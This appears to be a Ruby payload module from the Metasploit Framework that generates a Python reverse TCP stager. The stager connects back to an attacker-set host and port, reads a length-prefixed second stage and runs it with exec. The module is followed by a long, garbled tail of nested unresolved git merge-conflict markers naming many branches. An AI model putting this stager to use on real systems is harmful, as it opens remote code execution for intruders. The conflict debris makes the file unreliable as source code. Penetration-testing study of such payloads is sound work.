# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/python/send_uuid'

module Msf

###
#
# Complex reverse_tcp payload generation for Python
#
###

module Payload::Python::ReverseTcp

  include Msf::Payload::Python
  include Msf::Payload::Python::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
    }

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def generate_reverse_tcp(opts={})
    # Set up the socket
    cmd  = "import socket,struct\n"
    cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
    cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
    cmd << py_send_uuid if include_send_uuid
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(l)\n"
    cmd << "while len(d)<l:\n"
    cmd << "\td+=s.recv(l-len(d))\n"
    cmd << "exec(d,{'s':s})\n"

    py_create_exec_stub(cmd)
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end

end
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
=======

>>>>>>> 4.11.2_release_pre-rails4
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-framework
<<<<<<< HEAD
<<<<<<< HEAD
=======

<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======

>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======

>>>>>>> origin/msf-complex-payloads
=======

>>>>>>> origin/msf-complex-payloads
=======

>>>>>>> origin/payload-generator.rb
=======
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
>>>>>>> origin/pod/metasploit-windows.rb

>>>>>>> 4.11.2_release_pre-rails4
=======

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
<<<<<<< HEAD
=======
=======

>>>>>>> origin/pod/metasploit-api/_index.html
>>>>>>> 4.11.2_release_pre-rails4
=======

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======

>>>>>>> 4.11.2_release_pre-rails4
=======

>>>>>>> msf-complex-payloads
<<<<<<< HEAD
=======

>>>>>>> msf-complex-payloads
=======

>>>>>>> payload-generator.rb
<<<<<<< HEAD
=======

>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
=======

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======

<<<<<<< HEAD
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======

>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======

>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======

=======
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======

>>>>>>> origin/pod/metasploit-gemfile-
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======

>>>>>>> origin/4.11.2_release_pre-rails4
=======

>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======

>>>>>>> origin/msf-complex-payloads
=======

>>>>>>> origin/payload-generator.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html
